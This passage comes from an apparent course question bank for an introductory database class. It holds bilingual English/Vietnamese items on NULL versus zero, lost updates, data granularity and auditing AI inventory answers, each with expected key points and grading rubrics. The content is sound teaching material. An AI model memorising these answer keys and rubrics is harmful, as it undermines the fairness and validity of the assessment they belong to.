          accuracy_full: 'Identifies sample size, recency, and qualitative context checks.',
          reasoning_full: 'Explains how small sample sizes distort averages and AI summaries.',
          application_full: 'Applies directly to partner company evaluation tables.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A11_SCHEMA_EVOLUTION',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Schema Independence and Evolution',
    learning_objective: 'Explain how database schemas adapt as business requirements evolve',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'CampusMart initially sold only physical goods in-store, and now wants to support campus locker delivery. Why is modifying a well-structured database schema safer than rewriting dozens of hardcoded spreadsheet formulas?',
        prompt_vi: 'CampusMart ban đầu chỉ bán hàng trực tiếp tại quầy, nay muốn hỗ trợ giao hàng qua tủ đồ thông minh (campus locker). Tại sao việc mở rộng lược đồ CSDL được thiết kế tốt lại an toàn hơn so với việc sửa hàng chục công thức gán cứng trong file bảng tính?',
        context: 'CampusMart business model expansion.',
        expected_key_points: [
          'In a relational database, adding a new delivery table or nullable `locker_id` column does not break existing queries that explicitly select needed columns.',
          'In spreadsheets, inserting columns in the middle shifts cell coordinates and often breaks positional VLOOKUP/INDEX formulas.',
          'Logical data independence insulates existing reports from additive schema extensions.',
        ],
        acceptable_alternatives: ['Mentioning database views that preserve backward compatibility for existing dashboards.'],
        common_misconceptions: ['Assuming any schema change requires deleting and recreating the entire database from scratch.'],
        optional_follow_up: 'Why is `SELECT product_id, name FROM Products` safer during schema changes than `SELECT *` in application code?',
        rubric_specifics: {
          accuracy_full: 'Explains logical data independence and additive schema changes.',
          reasoning_full: 'Contrasts named relational attributes with positional spreadsheet coordinates.',
          application_full: 'Shows how locker delivery fields can be added cleanly.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'A small coffee shop adds seasonal drink customizations (oat milk, extra espresso shot). Why is storing each new option as a separate column (`has_oat_milk`, `has_almond_milk`, `has_soy_milk`, ...) harder to maintain than storing options as rows in an `OrderAddons` table?',
        prompt_vi: 'Quán cà phê bổ sung các tùy chọn pha chế theo mùa (sữa yến mạch, thêm shot espresso). Tại sao việc tạo thêm một cột mới cho mỗi tùy chọn (`has_oat_milk`, `has_almond_milk`,...) lại khó bảo trì hơn so với việc lưu các tùy chọn thành các dòng trong bảng `OrderAddons`?',
        context: 'Coffee shop menu customization modeling.',
        expected_key_points: [
          'Adding a new column for every new syrup or milk requires `ALTER TABLE` schema migrations and rewriting SQL queries.',
          'Storing customizations as rows in `OrderAddons` allows adding new menu add-ons purely by inserting data rows, with zero schema changes.',
          'Prevents wide, sparse tables filled mostly with NULLs or 0s.',
        ],
        acceptable_alternatives: ['Discussing how pricing per add-on is also easier to track in an `Addons` table.'],
        common_misconceptions: ['Thinking tables with 50 boolean columns are easier to aggregate for top-selling add-ons.'],
        optional_follow_up: 'How would you find the most popular add-on of the month if add-ons are stored as rows vs as 20 separate columns?',
        rubric_specifics: {
          accuracy_full: 'Contrasts schema modification (DDL) with data insertion (DML).',
          reasoning_full: 'Explains sparse columns and query complexity when options grow.',
          application_full: 'Applies to coffee shop drink customizations.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A12_GRANULARITY_CONCEPT',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Data Granularity (Fine vs. Coarse Grain)',
    learning_objective: 'Explain why capturing data at fine granularity preserves analytical flexibility',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'What does "data granularity" mean? If CampusMart only records a single daily total revenue number at 9:00 PM instead of recording each individual receipt, what business questions become impossible to answer later?',
        prompt_vi: '"Độ mịn của dữ liệu" (data granularity) là gì? Nếu CampusMart chỉ ghi lại duy nhất một con số tổng doanh thu cuối ngày lúc 21:00 thay vì lưu từng hóa đơn bán lẻ, những câu hỏi kinh doanh nào sẽ không thể trả lời được về sau?',
        context: 'CampusMart transaction logging design.',
        expected_key_points: [
          'Granularity refers to the level of detail represented by a single row in a table.',
          'You can always aggregate fine-grained data (receipts -> daily total), but you can never disaggregate coarse data back into details.',
          'Storing only daily totals makes it impossible to analyze peak hours, best-selling products, basket combinations, or cashier performance.',
        ],
        acceptable_alternatives: ['Giving specific examples like "Which item sold best at 12 PM?" or "What is Average Order Value?".'],
        common_misconceptions: ['Thinking coarse summary tables can be reversed by AI to recover exact individual transactions.'],
        optional_follow_up: 'Can an AI model reconstruct which student bought which textbook if only daily store revenue was saved?',
        rubric_specifics: {
          accuracy_full: 'Defines granularity and the one-way rule (can roll up, cannot drill down from summaries).',
          reasoning_full: 'Explains information loss when storing only daily aggregates.',
          application_full: 'Lists concrete lost insights (peak hour, product mix, AOV).',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In an internship attendance tracker, compare storing one row per student per semester (`total_days_present = 42`) versus storing one row per student per attendance date. Which design has finer granularity and why does it matter for dispute resolution?',
        prompt_vi: 'Trong hệ thống điểm danh thực tập, hãy so sánh việc lưu mỗi sinh viên 1 dòng cho cả học kỳ (`total_days_present = 42`) với việc lưu 1 dòng cho mỗi ngày đi thực tập. Thiết kế nào có độ mịn cao hơn và tại sao điều đó quan trọng khi cần đối soát khiếu nại?',
        context: 'Internship attendance tracking.',
        expected_key_points: [
          'One row per student per date has finer granularity (daily event grain vs semester summary grain).',
          'If a company supervisor and student disagree on whether the student attended on October 15, the semester counter `42` cannot prove which dates were counted.',
          'Daily attendance rows can still compute `COUNT(*) = 42` instantly while preserving full auditability.',
        ],
        acceptable_alternatives: ['Mentioning check-in/check-out timestamps and supervisor sign-off per shift.'],
        common_misconceptions: ['Worrying that 50 rows per student per semester is "too big" for a modern relational database.'],
        optional_follow_up: 'How would you compute `total_days_present` from the daily attendance table?',
        rubric_specifics: {
          accuracy_full: 'Identifies daily event table as finer granularity.',
          reasoning_full: 'Explains how event-level records support both aggregation and date-specific verification.',
          application_full: 'Connects to resolving internship attendance disputes.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A13_CONSTRAINTS_AS_RULES',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Database Constraints as Business Shield',
    learning_objective: 'Explain why business rules should be enforced in the database layer, not only in UI forms',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'A web developer says: "Our React checkout form already checks that `quantity > 0`, so we do not need a `CHECK (quantity > 0)` constraint in the database." Why is relying only on the UI form dangerous for CampusMart?',
        prompt_vi: 'Một lập trình viên web nói: "Biểu mẫu thanh toán React đã kiểm tra `quantity > 0` rồi nên không cần thêm ràng buộc `CHECK (quantity > 0)` trong CSDL nữa." Tại sao chỉ dựa vào kiểm tra ở giao diện lại nguy hiểm cho CampusMart?',
        context: 'Defense-in-depth data validation at CampusMart.',
        expected_key_points: [
          'Databases receive data from multiple paths beyond a single React form: CSV batch imports, backend scripts, API calls, mobile apps, or AI agents.',
          'A bug in any script or a bypassed frontend validation would insert `quantity = -5` or `0` into the database if the DB lacks a constraint.',
          'Database constraints act as the final, unbypassable gatekeeper of data integrity.',
        ],
        acceptable_alternatives: ['Giving an example of a faulty CSV import inserting negative prices.'],
        common_misconceptions: ['Assuming all data ever enters a database exclusively through one browser screen.'],
        optional_follow_up: 'Does having a database constraint mean we should remove the UI validation, or keep both? Why?',
        rubric_specifics: {
          accuracy_full: 'Explains why UI validation can be bypassed by imports, scripts, or APIs.',
          reasoning_full: 'Positions the database constraint as the last line of defense (defense-in-depth).',
          application_full: 'Explains dual role: UI for fast user feedback, DB for guaranteed integrity.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Name three different types of declarative constraints supported by relational databases (such as SQLite or PostgreSQL) and give one CampusMart business rule each constraint enforces.',
        prompt_vi: 'Hãy kể tên 3 loại ràng buộc khai báo (declarative constraints) trong CSDL quan hệ (như SQLite hoặc PostgreSQL) và nêu một quy tắc nghiệp vụ tại CampusMart tương ứng với mỗi loại ràng buộc đó.',
        context: 'Relational schema integrity design.',
        expected_key_points: [
          '`NOT NULL`: Every product must have a `product_name` and `unit_price`.',
          '`UNIQUE`: Two products cannot share the same barcode (`sku_barcode`).',
          '`CHECK`: `stock_qty >= 0` or `unit_price >= 0`.',
          '`PRIMARY KEY` / `FOREIGN KEY`: Every order must reference an existing customer or product.',
        ],
        acceptable_alternatives: ['Any 3 of PRIMARY KEY, FOREIGN KEY, UNIQUE, NOT NULL, CHECK with accurate business rules.'],
        common_misconceptions: ['Listing `SELECT` or `ORDER BY` as integrity constraints.'],
        optional_follow_up: 'What happens to an `INSERT` statement when it violates one of these constraints?',
        rubric_specifics: {
          accuracy_full: 'Correctly names 3 valid relational constraints.',
          reasoning_full: 'Explains how each rejects invalid state automatically.',
          application_full: 'Maps each constraint to a concrete CampusMart rule.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A14_NULL_SEMANTICS_INTRO',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Meaning of NULL vs. Zero vs. Empty String',
    learning_objective: 'Distinguish missing/unknown values (NULL) from zero (0) and blank strings',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'In an exam grading or customer feedback table, explain why a `NULL` score is fundamentally different from a score of `0`. What serious mistake occurs if an application stores `0` for students who have not taken the exam yet?',
        prompt_vi: 'Trong bảng chấm điểm thi hoặc bảng đánh giá của khách hàng, hãy giải thích vì sao giá trị `NULL` khác bản chất với điểm `0`. Sai lầm nghiêm trọng nào sẽ xảy ra nếu ứng dụng lưu điểm `0` cho những sinh viên chưa dự thi?',
        context: 'HSB3102E Grading & CampusMart Customer Rating tables.',
        expected_key_points: [
          '`NULL` means the value is unknown, not yet recorded, or not applicable (ungraded).',
          '`0` is a known, measured numeric value (the student took the test and scored zero points).',
          'Storing `0` for unexamined students drags down the class `AVG(score)` and makes it impossible to distinguish ungraded students from failing students.',
        ],
        acceptable_alternatives: ['Illustrating with CampusMart product ratings where unrated products would get a fake 0-star average.'],
        common_misconceptions: ['Treating `NULL` as equal to `0` in numeric columns.'],
        optional_follow_up: 'How does SQL’s `AVG(score)` handle rows where `score IS NULL` compared to rows where `score = 0`?',
        rubric_specifics: {
          accuracy_full: 'Clearly distinguishes `NULL` (missing/unrecorded) from `0` (measured zero).',
          reasoning_full: 'Explains the mathematical distortion on `AVG()` and operational status confusion.',
          application_full: 'Applies to exam grading or product review averages.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In CampusMart’s `Customers` table, compare storing `email = NULL` versus `email = ""` (empty string) when a walk-in student declines to provide an email address. Why does mixing both conventions in the same column cause bugs?',
        prompt_vi: 'Trong bảng `Customers` của CampusMart, hãy so sánh việc lưu `email = NULL` với `email = ""` (chuỗi rỗng) khi khách vãng lai không cung cấp email. Tại sao việc trộn lẫn cả hai cách lưu trong cùng một cột lại gây lỗi truy vấn và ràng buộc?',
        context: 'Customer contact data modeling.',
        expected_key_points: [
          '`NULL` explicitly signals absence of value; `""` is a known 0-length string.',
          'If a `UNIQUE` constraint is placed on `email`, multiple `""` empty strings will violate uniqueness, whereas multiple `NULL`s are permitted in standard SQL / SQLite.',
          'Queries checking only `WHERE email IS NOT NULL` will accidentally include `""` as if it were a valid email address.',
        ],
        acceptable_alternatives: ['Explaining how `COUNT(email)` ignores `NULL` but counts `""` as a valid email!'],
        common_misconceptions: ['Thinking `COUNT(email)` skips empty strings `""` automatically.'],
        optional_follow_up: 'What does `COUNT(email)` return if 5 rows have `NULL` and 3 rows have `""`?',
        rubric_specifics: {
          accuracy_full: 'Explains how `UNIQUE`, `IS NOT NULL`, and `COUNT(col)` treat `NULL` vs `""`.',
          reasoning_full: 'Shows how mixing both breaks email counts and uniqueness rules.',
          application_full: 'Recommends standardizing on `NULL` for missing optional emails.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_A15_DATA_LIFECYCLE_DECISION',
    lecture_ids: ['01'],
    question_group: 'A_CONCEPT',
    topic: 'Data-to-Decision Lifecycle',
    learning_objective: 'Trace how business events flow from capture to storage, analysis, and action',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'Trace the 4 stages of the data-to-decision lifecycle at CampusMart when a student buys a bottle of green tea: (1) Capture, (2) Storage, (3) Analysis/Reporting, and (4) Business Decision.',
        prompt_vi: 'Hãy mô tả 4 giai đoạn của vòng đời từ dữ liệu đến quyết định tại CampusMart khi sinh viên mua một chai trà xanh: (1) Thu thập, (2) Lưu trữ, (3) Phân tích/Báo cáo, và (4) Ra quyết định kinh doanh.',
        context: 'End-to-end data literacy framework.',
        expected_key_points: [
          'Capture: Barcode scanner reads SKU and POS records timestamp, quantity, and payment method.',
          'Storage: Validated transaction rows are committed into `Orders` and `OrderLines` tables in the RDBMS.',
          'Analysis: SQL query aggregates hourly beverage sales and compares against stock levels.',
          'Decision: Store manager restocks the cold fridge before afternoon classes and negotiates volume discount with the beverage supplier.',
        ],
        acceptable_alternatives: ['Tracing an internship application from form submission to placement analytics.'],
        common_misconceptions: ['Skipping validation/storage and assuming raw sensor scans directly produce executive strategy.'],
        optional_follow_up: 'If stage (1) Capture records the wrong barcode (e.g., cashier scans 1 bottle 5 times for 5 different flavors), how does that affect stage (4)?',
        rubric_specifics: {
          accuracy_full: 'Clearly describes all 4 lifecycle stages in logical order.',
          reasoning_full: 'Shows how each stage depends on the integrity of the previous stage.',
          application_full: 'Uses a concrete CampusMart beverage purchase example.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'At CampusMart, cashiers often scan one "Lemon Tea" barcode 4 times when a student buys 1 Lemon Tea, 1 Peach Tea, 1 Oolong Tea, and 1 Milk Tea because all four cost 15,000 VND. Why does this shortcut pass the cash register total check but ruin inventory and AI demand forecasting?',
        prompt_vi: 'Tại CampusMart, khi sinh viên mua 1 Trà chanh, 1 Trà đào, 1 Trà ô long và 1 Trà sữa (đồng giá 15.000đ), thu ngân thường tiện tay quét mã vạch "Trà chanh" 4 lần. Tại sao thói quen này không làm lệch tổng tiền thu ngân nhưng lại phá hỏng dữ liệu tồn kho và dự báo nhu cầu của AI?',
        context: 'Operational data capture discipline at CampusMart.',
        expected_key_points: [
          'While total revenue (4 × 15,000 = 60,000 VND) is financially correct, SKU-level product data is corrupted.',
          'Database stock shows Lemon Tea depleted by 4 while Peach/Oolong/Milk Tea appear unsold ("phantom inventory").',
          'Any AI replenishment model trained on this data will over-order Lemon Tea and let the other three flavors run out of stock.',
        ],
        acceptable_alternatives: ['Linking operational capture shortcuts to Garbage In, Garbage Out (GIGO) in downstream analytics.'],
        common_misconceptions: ['Thinking that as long as the daily cash drawer balances, the database is accurate.'],
        optional_follow_up: 'How can store training or POS UI design discourage this scanning shortcut?',
        rubric_specifics: {
          accuracy_full: 'Distinguishes financial total accuracy from SKU-level inventory accuracy.',
          reasoning_full: 'Traces how skewed SKU counts cause phantom stock and distorted AI forecasts.',
          application_full: 'Provides a practical POS/operational remedy.',
        },
      },
    ],
  },

  // ============================================================================
  // LECTURE 01 — GROUP B (Applied / Analytical: 15 families × 2 variants = 30 questions)
  // ============================================================================
  {
    family_suffix: 'L01_B01_AUDIT_FLAT_LOG',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Auditing Flat Spreadsheet Logs',
    learning_objective: 'Identify operational anomalies in a denormalized spreadsheet table',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'Inspect the following CampusMart spreadsheet extract. Identify two specific data anomalies present in these 4 rows and explain how they distort a report on "Total Revenue by Supplier".',
        prompt_vi: 'Quan sát trích xuất bảng tính CampusMart dưới đây. Hãy chỉ ra 2 bất thường dữ liệu cụ thể trong 4 dòng này và giải thích cách chúng làm sai lệch báo cáo "Tổng doanh thu theo Nhà cung cấp".',
        context: 'CampusMart manual Excel sales log.',
        optional_table_or_diagram: `+-----+------------+------------------+---------+-----------+
| Row | Date       | Supplier_Name    | Item    | Total_VND |
+-----+------------+------------------+---------+-----------+
|  1  | 2026-10-01 | Thien Long Corp  | Gel Pen | 15,000    |
|  2  | 2026-10-01 | ThienLong        | Notebook| 30,000    |
|  3  | 2026-10-02 | Deli Vietnam     | Stapler | 45000 VND |
|  4  | 2026-10-02 | Thien Long Corp  | Gel Pen | -15,000   |
+-----+------------+------------------+---------+-----------+`,
        expected_key_points: [
          'Inconsistent naming / entity representation: "Thien Long Corp" (Rows 1, 4) vs "ThienLong" (Row 2) causes `GROUP BY Supplier_Name` to split one supplier into two separate rows.',
          'Inconsistent data type / formatting in `Total_VND`: Row 3 contains text `"45000 VND"` while others have commas or negative numbers (`-15,000` without a transaction type flag indicating whether it is a refund or a typo).',
          'Result: `SUM(Total_VND)` fails or ignores text cells and splits Thien Long’s revenue.',
        ],
        acceptable_alternatives: ['Pointing out missing primary key, missing quantity vs unit price separation.'],
        common_misconceptions: ['Assuming SQL or Excel automatically merges "Thien Long Corp" and "ThienLong" without cleaning or foreign keys.'],
        optional_follow_up: 'What should replace the free-text `Supplier_Name` column in a relational design?',
        rubric_specifics: {
          accuracy_full: 'Pinpoints both the supplier naming split and the mixed text/numeric format in `Total_VND`.',
          reasoning_full: 'Explains how `GROUP BY` and `SUM()` behave on these inconsistent values.',
          application_full: 'Recommends a `supplier_id` foreign key and strict numeric column plus transaction type.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Examine the campus coffee shop shift sheet below. If an AI assistant sums the `Cash_Collected` column to report morning revenue, what exact numeric error occurs and why?',
        prompt_vi: 'Quan sát bảng ca làm việc của quán cà phê dưới đây. Nếu trợ lý AI cộng cột `Cash_Collected` để báo cáo doanh thu buổi sáng, sai số cụ thể nào sẽ xảy ra và tại sao?',
        context: 'Campus Coffee Shop morning shift spreadsheet.',
        optional_table_or_diagram: `+--------+----------+----------------+----------------+
| Row_ID | Time     | Drink_Sold     | Cash_Collected |
+--------+----------+----------------+----------------+
|   10   | 07:30 AM | Iced Latte     | 35000          |
|   11   | 07:45 AM | Matcha Latte   | 40000          |
|   12   | 08:00 AM | Cold Brew      | 35000          |
|   13   | 08:05 AM | SUBTOTAL 7-8AM | 110000         |
+--------+----------+----------------+----------------+`,
        expected_key_points: [
          'Row 13 is an inline subtotal row (`110000 = 35000 + 40000 + 35000`) mixed into the same table as individual drink transactions.',
          'Summing the entire `Cash_Collected` column yields `220,000` VND instead of the true revenue of `110,000` VND (100% double-counting!).',
          'Relational tables must keep uniform row grain (only atomic transactions in the table; subtotals belong in queries/views).',
        ],
        acceptable_alternatives: ['Identifying mixed grain (transaction rows mixed with summary rows).'],
        common_misconceptions: ['Saying the sum is 110,000 without noticing Row 13 doubles the total to 220,000.'],
        optional_follow_up: 'Why do human spreadsheet users often insert subtotal rows that break database imports?',
        rubric_specifics: {
          accuracy_full: 'Calculates the exact double-counted sum (220,000 vs actual 110,000).',
          reasoning_full: 'Explains that mixing summary rows with transaction rows violates uniform table grain.',
          application_full: 'States that subtotals should be computed dynamically via SQL `SUM()`, never stored as transaction rows.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B02_DIAGNOSE_LOST_UPDATE',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Tracing Concurrent Stock Updates',
    learning_objective: 'Trace a lost update anomaly across two concurrent checkout sessions',
    variants: [
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: true,
        prompt_en: 'Look at the timeline below for product `SKU_101` (Campus Hoodie, initial `stock = 10`). Both Cashier A and Cashier B read the stock before either saves. What final stock value gets written to the naive file, what should the true stock be, and how does an atomic SQL update fix it?',
        prompt_vi: 'Quan sát dòng thời gian dưới đây của sản phẩm `SKU_101` (Áo khoác trường, `stock` ban đầu = 10). Cả Thu ngân A và Thu ngân B cùng đọc tồn kho trước khi lưu. Giá trị tồn kho cuối cùng bị ghi vào file là bao nhiêu, giá trị đúng phải là bao nhiêu, và câu lệnh SQL nguyên tử khắc phục lỗi này thế nào?',
        context: 'Concurrent checkout at CampusMart.',
        optional_table_or_diagram: `Time | Cashier A (sells 3 hoodies)       | Cashier B (sells 2 hoodies)
-----+-----------------------------------+-----------------------------------
t1   | Reads stock = 10                  |
t2   |                                   | Reads stock = 10
t3   | Computes 10 - 3 = 7, writes 7     |
t4   |                                   | Computes 10 - 2 = 8, writes 8`,
        expected_key_points: [
          'At `t4`, Cashier B overwrites `7` with `8`, so the final saved stock is `8` (Cashier A’s deduction of 3 units is completely lost!).',
          'The true remaining stock after selling 3 + 2 = 5 hoodies must be `10 - 5 = 5`.',
          'Fix: Use an atomic database update `UPDATE Products SET stock = stock - :qty WHERE sku = "SKU_101" AND stock >= :qty` inside a transaction with row-level locking.',
        ],
        acceptable_alternatives: ['Explaining serializable/row lock execution so t2 waits until t3 commits.'],
        common_misconceptions: ['Calculating final written stock as 5 by forgetting that Cashier B read `stock = 10` at `t2`.'],
        optional_follow_up: 'What business problem happens tomorrow if the database says `stock = 8` when only 5 hoodies are physically on the shelf?',
        rubric_specifics: {
          accuracy_full: 'Correctly states written value = 8 vs true value = 5.',
          reasoning_full: 'Explains how `t4` overwrites `t3` due to stale read at `t2` (lost update).',
          application_full: 'Proposes atomic relative decrement `SET stock = stock - qty` with locking.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Trace the loyalty points update below for Student `S_205` (starting balance = `100` points). Why does the student end up with fewer points than earned, and how should the database handle point increments?',
        prompt_vi: 'Hãy theo dõi quá trình cộng điểm tích lũy dưới đây của Sinh viên `S_205` (số dư đầu = `100` điểm). Tại sao sinh viên lại bị thiếu điểm so với thực tế, và CSDL nên xử lý thao tác cộng điểm như thế nào?',
        context: 'CampusMart loyalty app & POS simultaneous point award.',
        optional_table_or_diagram: `Step | Mobile App (Bonus +20 pts)        | POS Terminal (Purchase +50 pts)
-----+-----------------------------------+-----------------------------------
 1   | SELECT points -> gets 100         | SELECT points -> gets 100
 2   | SET points = 120                  |
 3   |                                   | SET points = 150`,
        expected_key_points: [
          'Step 3 overwrites `120` with `150`, losing the +20 mobile bonus points.',
          'Correct balance should be `100 + 20 + 50 = 170` points.',
          'Solution: Either use relative atomic update (`SET points = points + 50`) or append immutable point-ledger rows (`+100`, `+20`, `+50`) and sum them.',
        ],
        acceptable_alternatives: ['Recommending an append-only `LoyaltyLedger` transaction table.'],
        common_misconceptions: ['Saying the final balance is 120 (Step 3 runs last so 150 overwrites 120).'],
        optional_follow_up: 'Why is an append-only `LoyaltyTransactions` table even better for auditing than only updating a single `points` number?',
        rubric_specifics: {
          accuracy_full: 'Identifies overwritten balance (150 instead of 170).',
          reasoning_full: 'Explains read-modify-write race condition.',
          application_full: 'Suggests atomic increment or append-only point ledger.',
        },
      },
    ],
  },
  // L01_B03 to L01_B15
  {
    family_suffix: 'L01_B03_VERIFY_AI_INVENTORY_CLAIM',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Verifying AI Assistant Inventory Answers Against Table Data',
    learning_objective: 'Check an AI-generated summary against actual database rows',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'A manager asks an AI assistant: "Which items at CampusMart need immediate reordering (available stock below reorder level)?" The AI replies: "Only SKU P02 needs reordering." Check the table below and evaluate why the AI’s answer is incomplete and risky.',
        prompt_vi: 'Quản lý hỏi trợ lý AI: "Những mặt hàng nào tại CampusMart cần đặt nhập hàng ngay (tồn kho khả dụng thấp hơn mức đặt lại)?" AI trả lời: "Chỉ có mã P02 cần đặt hàng lại." Hãy kiểm tra bảng dữ liệu dưới đây và đánh giá vì sao câu trả lời của AI bị thiếu và gây rủi ro.',
        context: 'CampusMart inventory table audit.',
        optional_table_or_diagram: `+------+-------------------+--------------+---------------+---------------+
| SKU  | Product_Name      | On_Hand_Qty  | Reserved_Qty  | Reorder_Level |
+------+-------------------+--------------+---------------+---------------+
| P01  | USB-C Hub         |      12      |       5       |      10       |
| P02  | Scientific Calc   |       4      |       0       |       8       |
| P03  | A4 Paper Ream     |      20      |       2       |      15       |
| P04  | Lab Coat          |       9      |       9       |       5       |
+------+-------------------+--------------+---------------+---------------+`,
        expected_key_points: [
          'Available stock to sell is `On_Hand_Qty - Reserved_Qty`, not raw `On_Hand_Qty`.',
          'For `P01` (USB-C Hub): `12 - 5 = 7` available, which is `< 10` (`Reorder_Level`).',
          'For `P02` (Scientific Calc): `4 - 0 = 4 < 8`.',
          'For `P04` (Lab Coat): `9 - 9 = 0 < 5` (completely out of unreserved stock!).',
          'The AI naively compared `On_Hand_Qty < Reorder_Level` and missed both `P01` and `P04`.',
        ],
        acceptable_alternatives: ['Showing the exact available stock calculation for all 4 SKUs (P01=7, P02=4, P03=18, P04=0).'],
        common_misconceptions: ['Agreeing with the AI because 12 >= 10 and 9 >= 5 without subtracting `Reserved_Qty`.'],
        optional_follow_up: 'Write the arithmetic condition the query should use in the `WHERE` clause.',
        rubric_specifics: {
          accuracy_full: 'Identifies P01 (avail=7 < 10), P02 (avail=4 < 8), and P04 (avail=0 < 5).',
          reasoning_full: 'Explains that the AI ignored `Reserved_Qty` when computing sellable stock.',
          application_full: 'Provides the correct rule: `(On_Hand_Qty - Reserved_Qty) < Reorder_Level`.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In the internship placement table below, an AI assistant reports: "There are 15 open internship seats remaining across all companies." Verify this number against the table and explain the AI’s mistake.',
        prompt_vi: 'Trong bảng phân bổ thực tập dưới đây, trợ lý AI báo cáo: "Hiện còn 15 suất thực tập trống trên toàn bộ các công ty." Hãy kiểm chứng con số này với bảng dữ liệu và giải thích lỗi của AI.',
        context: 'University Internship quota tracking.',
        optional_table_or_diagram: `+------------+---------------+------------+---------------+------------------+
| Company_ID | Company_Name  | Quota_Max  | Filled_Seats  | Contract_Status  |
+------------+---------------+------------+---------------+------------------+
| C01        |FPT Software   |     10     |       6       | ACTIVE           |
| C02        |Viettel AI     |      8     |       3       | ACTIVE           |
| C03        |Alpha Startup  |      6     |       0       | EXPIRED          |
+------------+---------------+------------+---------------+------------------+`,
        expected_key_points: [
          'Remaining seats per row: C01 = `10 - 6 = 4`; C02 = `8 - 3 = 5`; C03 = `6 - 0 = 6`.',
          'The AI summed `4 + 5 + 6 = 15` across all rows without filtering `WHERE Contract_Status = "ACTIVE"`.',
          'Because `C03` has an `EXPIRED` contract, its 6 seats cannot be assigned. True available seats = `4 + 5 = 9`.',
        ],
        acceptable_alternatives: ['Highlighting the missing business status filter in the AI query.'],
        common_misconceptions: ['Only checking the subtraction math (10-6+8-3+6-0 = 15) and missing the `Contract_Status = EXPIRED` column.'],
        optional_follow_up: 'What happens if the coordinator promises 15 students an internship based on the AI’s number?',
        rubric_specifics: {
          accuracy_full: 'Calculates 9 active open seats vs the AI’s 15.',
          reasoning_full: 'Explains that C03 (6 seats) has `Contract_Status = EXPIRED` and must be excluded.',
          application_full: 'Specifies filtering `Contract_Status = "ACTIVE"` before summing `(Quota_Max - Filled_Seats)`.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B04_NULL_VS_ZERO_TABLE_CALC',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Impact of NULL vs. 0 on Table Aggregations',
    learning_objective: 'Calculate exact averages when NULLs are properly stored vs wrongly replaced with 0',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'Examine the 4 student midterm records below. Student S04 was absent and has not taken the exam. Calculate the class average score under two cases: (Case A) S04’s score is stored as `NULL`, and (Case B) a buggy script stores S04’s score as `0`. Which average reflects the actual performance of students who took the exam?',
        prompt_vi: 'Quan sát 4 bản ghi điểm giữa kỳ dưới đây. Sinh viên S04 vắng có phép và chưa dự thi. Hãy tính điểm trung bình của lớp trong hai trường hợp: (Trường hợp A) điểm của S04 lưu là `NULL`, và (Trường hợp B) một đoạn mã lỗi lưu điểm của S04 là `0`. Giá trị trung bình nào phản ánh đúng kết quả của các sinh viên đã thi?',
        context: 'HSB3102E Gradebook calculation check.',
        optional_table_or_diagram: `+------------+---------------+------------+---------------+
| Student_ID | Status        | Case_A_Val | Case_B_Val    |
+------------+---------------+------------+---------------+
| S01        | COMPLETED     |    8.0     |      8.0      |
| S02        | COMPLETED     |    7.0     |      7.0      |
| S03        | COMPLETED     |    9.0     |      9.0      |
| S04        | ABSENT_DEFER  |   NULL     |      0.0      |
+------------+---------------+------------+---------------+`,
        expected_key_points: [
          'Case A (`NULL`): `AVG` ignores `NULL` rows, dividing by 3 examined students: `(8.0 + 7.0 + 9.0) / 3 = 24.0 / 3 = 8.0`.',
          'Case B (`0.0`): `AVG` includes S04 in the denominator of 4: `(8.0 + 7.0 + 9.0 + 0.0) / 4 = 24.0 / 4 = 6.0`.',
          'Case A (`8.0`) is accurate because S04 has not been assessed yet; Case B artificially lowers the class average by 2 full points.',
        ],
        acceptable_alternatives: ['Also noting that `COUNT(Case_A_Val)` is 3 while `COUNT(Case_B_Val)` is 4.'],
        common_misconceptions: ['Thinking `AVG` in SQL divides the sum of non-null values by the total row count (4) instead of non-null count (3).'],
        optional_follow_up: 'If a student actually attended the exam and answered nothing right, should their score be `0.0` or `NULL`?',
        rubric_specifics: {
          accuracy_full: 'Computes Case A = 8.0 and Case B = 6.0 accurately.',
          reasoning_full: 'Explains how SQL `AVG()` excludes `NULL` from both numerator and denominator.',
          application_full: 'Distinguishes unexamined (`NULL`) from examined with zero knowledge (`0.0`).',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
